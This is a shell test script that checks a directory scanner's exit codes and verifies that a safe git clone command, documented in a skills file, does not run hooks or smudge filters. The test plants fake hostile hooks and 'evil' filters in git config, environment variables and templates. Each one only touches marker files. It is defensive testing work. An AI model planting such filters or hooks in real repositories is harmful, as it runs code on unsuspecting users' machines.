scan --max -1 "$T/clean"; check "--max -1 is a usage error (3)" '[ $rc -eq 3 ]'
scan --bogus "$T/clean"; check "an unknown flag is a usage error (3)" '[ $rc -eq 3 ]'
scan "$T/missing"; check "a missing DIR exits 2" '[ $rc -eq 2 ]'
scan "$T/evil.sh"; check "a file instead of a DIR exits 2" '[ $rc -eq 2 ]'

check "no scanned file ever ran: the canary is absent" '[ ! -e "$CANARY" ]'
# --- the documented clone runs no hook or filter from the user's own git config -----------
SKILL=$(cd "$(dirname "$0")/.." && pwd)/skills/evaluating-third-party-tools/SKILL.md
G=$T/gitsrc; mkdir -p "$G" "$T/fakehome/hooks"
git -C "$G" init -q && printf '* filter=evil\n' > "$G/.gitattributes" && echo hi > "$G/a.txt"
git -C "$G" add -A && git -C "$G" -c user.name=t -c user.email=t@t commit -qm init
printf '#!/bin/sh\ntouch "%s/hook-ran"\n' "$T" > "$T/fakehome/hooks/post-checkout"; chmod +x "$T/fakehome/hooks/post-checkout"
printf '[filter "evil"]\n\tsmudge = touch %s/filter-ran && cat\n[core]\n\thooksPath = %s/fakehome/hooks\n' "$T" "$T" > "$T/fakehome/.gitconfig"
( unset GIT_CONFIG_GLOBAL; cd "$T" && HOME="$T/fakehome" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_COUNT=0 git clone -q "file://$G" "$T/plain" ) >/dev/null 2>&1
check "control: a plain clone runs the user's filter and hook" '[ -e "$T/filter-ran" ] && [ -e "$T/hook-ran" ]'
command rm -f "$T/filter-ran" "$T/hook-ran"
cmd=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned#")
( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0="$T/fakehome/hooks"; cd "$T" && HOME="$T/fakehome" eval "$cmd" ) >/dev/null 2>&1
check "the clone command in SKILL.md runs no user filter or hook" '[ -n "$cmd" ] && [ -f "$T/cloned/a.txt" ] && [ ! -e "$T/filter-ran" ] && [ ! -e "$T/hook-ran" ]'
cmd2=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned2#")
( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_PARAMETERS="'filter.evil.smudge'='touch $T/filter-ran && cat'"; cd "$T" && HOME="$T/fakehome" eval "$cmd2" ) >/dev/null 2>&1
check "the clone command ignores a filter set in GIT_CONFIG_PARAMETERS too" '[ -f "$T/cloned2/a.txt" ] && [ ! -e "$T/filter-ran" ]'
mkdir -p "$T/tmpl"; printf '[filter "evil"]\n\tsmudge = touch %s/filter-ran && cat\n' "$T" > "$T/tmpl/config"
cmd3=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned3#")
( unset GIT_CONFIG_GLOBAL; export GIT_TEMPLATE_DIR="$T/tmpl"; cd "$T" && HOME="$T/fakehome" eval "$cmd3" ) >/dev/null 2>&1
check "the clone command ignores a filter in a git template's config" '[ -f "$T/cloned3/a.txt" ] && [ ! -e "$T/filter-ran" ]'

echo "$pass passed, $fail failed"
rm -rf "$T"
[ "$fail" -eq 0 ]
